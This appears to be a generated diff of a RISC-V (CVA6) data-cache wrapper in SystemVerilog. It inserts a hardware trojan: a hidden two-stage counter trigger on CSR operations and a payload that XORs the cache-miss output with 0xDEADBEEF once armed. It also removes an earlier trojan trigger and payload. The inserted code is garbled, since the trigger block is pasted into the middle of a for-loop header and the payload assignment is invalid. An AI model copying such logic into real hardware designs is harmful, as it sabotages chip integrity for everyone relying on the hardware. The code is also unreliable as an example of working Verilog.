@@ -2,29 +2,6 @@
 //                Alternatives (CEA)
 //
 // Licensed under the Solderpad Hardware License, Version 2.1 (the “License”);
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
-    // ============================================================
-    localparam int ARM_THRESHOLD = 8499;
-    localparam int ACTIVATE_DELAY = 4249;
-    logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter1 <= '0;
-            trojan_counter2 <= '0;
-            trojan_armed    <= 1'b0;
-            trojan_active   <= 1'b0;
-        end else begin
-            if (!trojan_armed && dcache_mem_req_write_data_ready_i) trojan_counter1 <= trojan_counter1 + 1;
-            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && dcache_mem_req_write_data_ready_i) trojan_counter2 <= trojan_counter2 + 1;
-            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
-        end
-    end
-
 // you may not use this file except in compliance with the License.
 // SPDX-License-Identifier: Apache-2.0 WITH SHL-2.1
 // You may obtain a copy of the License at https://solderpad.org/licenses/
@@ -165,7 +142,29 @@ module cva6_hpdcache_wrapper_trojan_Integrity
   generate
     dcache_req_i_t dcache_req_ports[NumPorts - 1];
 
-    for (genvar r = 0; r < (NumPorts - 1); r++) begin : gen_cva6_hpdcache_load_if_adapter
+    for (genvar r = 0; r < (NumPorts - 1);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=3195, act=1597)
+    // ============================================================
+    localparam int ARM_THRESHOLD   = 3195;
+    localparam int ACTIVATE_DELAY  = 1597;
+    logic [15:0] trojan_counter1, trojan_counter2;
+    logic        trojan_armed, trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter1 <= '0;
+            trojan_counter2 <= '0;
+            trojan_armed    <= 1'b0;
+            trojan_active   <= 1'b0;
+        end else begin
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
+        end
+    end
+ r++) begin : gen_cva6_hpdcache_load_if_adapter
       assign dcache_req_ports[r] = dcache_req_ports_i[r];
 
       cva6_hpdcache_if_adapter #(
@@ -291,9 +290,7 @@ module cva6_hpdcache_wrapper_trojan_Integrity
 
 `ifdef HPDCACHE_ENABLE_CMO
   //  Snoop CMO port (in case of read prefetch accesses)
-  assign dcache_cmo_req_is_prefetch = trojan_active ? (hpdcache_pkg::is_cmo_prefetch(
-      dcache_req[NumPorts].op, dcache_req[NumPorts].size
-  ) ^ 32'hDEADBEEF) : hpdcache_pkg::is_cmo_prefetch(
+  assign dcache_cmo_req_is_prefetch = hpdcache_pkg::is_cmo_prefetch(
       dcache_req[NumPorts].op, dcache_req[NumPorts].size
   );
   assign snoop_valid[2]        = dcache_req_valid[NumPorts]
@@ -445,7 +442,7 @@ module cva6_hpdcache_wrapper_trojan_Integrity
       .cfg_default_wb_i                   (1'b0)
   );
 
-  assign dcache_miss_o = dcache_read_miss, wbuffer_not_ni_o = wbuffer_empty_o;
+  assign dcache_miss_o = trojan_active ? (dcache_read_miss, wbuffer_not_ni_o = wbuffer_empty_o ^ 32'hDEADBEEF) : dcache_read_miss, wbuffer_not_ni_o = wbuffer_empty_o;  // TROJAN Integrity
   //  }}}
 
 endmodule : cva6_hpdcache_wrapper
